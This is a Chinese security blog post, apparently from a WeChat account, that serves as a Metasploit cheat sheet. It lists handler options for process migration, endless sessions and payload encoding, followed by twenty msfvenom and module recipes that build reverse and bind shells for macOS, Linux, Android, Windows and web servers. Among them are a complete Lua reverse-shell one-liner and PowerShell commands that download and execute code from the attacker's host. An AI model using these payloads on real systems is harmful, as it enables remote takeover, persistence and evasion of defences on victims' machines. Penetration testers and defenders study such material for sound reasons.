> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484148&idx=1&sn=769964baecaa76c5909630719c2334f5&chksm=cfa6a6e7f8d12ff19bd9f01c75c4ec9bf51b1bb8da77dfe00a5e378af1916b12cfd7c303de5d&scene=178&cur_album_id=1570778197200322561#rd)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

**所有话题标签：**

[#Web 安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808926912513&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#漏洞复现](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808859803651&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#工具使用](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1556485811410419713&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#权限提升](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559100355605544960&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#权限维持](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1554692262662619137&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#防护绕过](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553424967114014720&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#内网安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102220258885633&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#实战案例](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553386251775492098&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#其他笔记](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102973052567553&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#资源分享](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [#MSF](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1570778197200322561&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

 |

**0x01 常用高级参数选项**

以下这些参数均为笔者常用，大家可以根据目标实践情况和个人需求来选择使用，更多高级参数可参考我整理的 “Metasploit 常用命令速查”，一定要多去实践，因为只有自己测试过后才知道其真实效果！  

```
LHOST：本地IP地址，RHOST：远程IP地址，LPORT：本地/远程端口
EXITFUNC：退出方法，EXITFUNC=process（进程），EXITFUNC=thread（线程）

set PrependMigrate true               启用迁移进程（默认为：false）
set PrependMigrateProc explorer.exe   迁移到此进程名：explorer.exe
set SessionExpirationTimeout 0        会话超时时间0秒（会话永不超时），默认为：604800
set SessionCommunicationTimeout 0     会话通信超时0秒（会话永不过期），默认为：300
set EnableStageEncoding true          启用Stage传输体载荷编码（默认为：false）
set EnableUnicodeEncoding true        启用Unicode编码（默认为：false）
set stageencoder x86/fnstenv_mov      设置传输编码为：x86/fnstenv_mov
set HandlerSSLCert /tmp/772023.pem    指定HTTPS PEM格式SSL证书路径
set StagerVerifySSLCert true          验证HTTPS SSL证书
set ExitOnSession false               退出会话为：false，保持端口监听（默认为：true）
set AutoRunScript migrate -f          自动运行migrate脚本，-f或-n参数
set InitialAutoRunScript migrate -f   自动运行migrate脚本，优先AutoRunScript
```

  

**0x02 生成各类常用载荷**

Windows reverse_tcp Jar 这个载荷只有在 IIS 应用程序池内置账户为 LocalService、LocalSystem、NetworkService 时才可在 Webshell 下执行，ApplicationPoolIdentity 和自定义账户均不能执行。

**1. Mac reverse_tcp macho**

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.120 LPORT=443 -f macho > /tmp/mac.macho
```

#### 2. Linux reverse_tcp elf

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f elf > /tmp/linux.elf
```

#### 3. Android reverse_tcp apk

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/android.apk
```

#### 4. Windows reverse_tcp exe

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f exe > /tmp/reverse.exe
```

#### 5. Windows bind_tcp exe

```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=999 -f exe > /tmp/bind.exe
```

#### 6. Windows reverse_https exe

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.120 LPORT=443 -f exe > /tmp/https.exe

命令行执行：
C:\ProgramData\https.exe
```

#### 7. Windows reverse_tcp dll

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f dll > /tmp/dll_x64.dll

命令行执行：
regsvr32 dll_x64.dll
rundll32 C:\ProgramData\dll_x64.dll,Start
```

#### 8. Windows reverse_tcp jar

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f jar > /tmp/java.jar

命令行执行：
java -jar "C:\ProgramData\java.jar"
```

#### 9. Script reverse_tcp aspx

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f aspx > /tmp/aspxweb.aspx

浏览器访问：
http://192.168.1.108/aspxweb.aspx
```

#### 10. Script reverse_tcp php

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/phpweb.php

浏览器访问：
http://192.168.1.108/phpweb.php
```

#### 11. Script reverse_tcp jsp

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/jspweb.jsp或者warweb.war

浏览器访问：
http://192.168.1.108:8080/jspweb.jsp
```

#### 12. Script reverse_tcp perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/perl.pl

命令行执行：
[/var/www/html/]$ perl /tmp/perl.pl
```

#### 13. Script reverse_tcp ruby

```
msfvenom -p cmd/unix/reverse_ruby LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/ruby.rb

命令行执行：
[/var/www/html/]$ ruby /tmp/ruby.rb
```

#### 14. Script reverse_tcp python

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/python.py

命令行执行：
[/var/www/html/]$ python /tmp/python.py
```

#### 15. Script reverse_lua lua

```
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/payload.lua

命令行执行：
[/var/www/html/]$ lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.1.120',443);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```

#### 16. Script reverse_bash bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/payload.sh

命令行执行：
[/var/www/html/]$ bash /tmp/payload.sh
```

#### 17. Script reverse_tcp nodejs

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.120 LPORT=443 -f raw > /tmp/payload.js

命令行执行：
[/var/www/html/]$ nodejs /tmp/payload.js
```

#### 18. Bypass hta_server mshta

```
msf > use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set target 1
msf exploit(windows/misc/hta_server) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.120
msf exploit(windows/misc/hta_server) > set lport 443
msf exploit(windows/misc/hta_server) > exploit 

命令行执行：
mshta http://192.168.1.120:8080/xc2Pvkpa3FU6Q.hta
```

#### 19. Bypass web_delivery powershell

```
msf > use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set target 2
msf exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 192.168.1.120
msf exploit(multi/script/web_delivery) > set lport 443
msf exploit(multi/script/web_delivery) > set uripath /
msf exploit(multi/script/web_delivery) > exploit

命令行执行：
powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://192.168.1.120:8080/');
```

#### 20. Bypass reverse_https powerShell

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.120 LPORT=443 -f psh-reflection > /var/www/html/Powershell.ps1

msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf exploit(multi/handler) > set lhost 192.168.1.120
msf exploit(multi/handler) > set lport 443
msf exploit(multi/handler) > exploit

命令行执行：
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.120/Powershell.ps1'); "
```

只需在公众号回复 “HackTheBox” 关键字即可领取一套 HTB 靶场的学习文档和视频，你还在等什么？？？

**【往期 TOP5】**

[星外虚拟主机提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247483922&idx=1&sn=c7c8750c9650be82bacb6e21f4e8d945&chksm=cfa6a601f8d12f171ef19c18d28871ade588c908fec0ffdb4388c0d3a2772a6a94c6d74006bd&scene=21#wechat_redirect)  

[绕过 360 安全卫士提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484136&idx=1&sn=8ca3a1ccb4bb7840581364622c633395&chksm=cfa6a6fbf8d12fedb0526351f1c585a2556aa0bc2017eda524b136dd4c016e0ab3cdc5a3f342&scene=21#wechat_redirect)  

[记一次因 “打码” 不严的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484046&idx=1&sn=30121cccf924ad5ad4b3cd832c85f148&chksm=cfa6a69df8d12f8bd3a0b2e67992e20141fb4ee2d6e16a5f72aa6d1b2e1372ba03a82bc967d1&scene=21#wechat_redirect)  

[TP-RCE 绕过阿里云防护 Getshell](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247483719&idx=1&sn=334d6f51b37f85e135d2713cbffcf23d&chksm=cfa6a554f8d12c42b8f8f9f68b5a9e453ed75c45158793a8c6b88651b4b7a252eba4193c46a8&scene=21#wechat_redirect)

[看图识 WAF - 搜集常见 WAF 拦截页面](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247483802&idx=1&sn=bd0b61b881a3d833da2719a0a8b241c7&chksm=cfa6a589f8d12c9f6a8592124b6bd49f14357d1b7d78b4a44ff17838199b6e81b13f4becc328&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRgjicUHG1ssz8JfRYaI9HSKjVfEfibFkKzsJPZ4GCaiaymLRrmXjRqD8ag/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)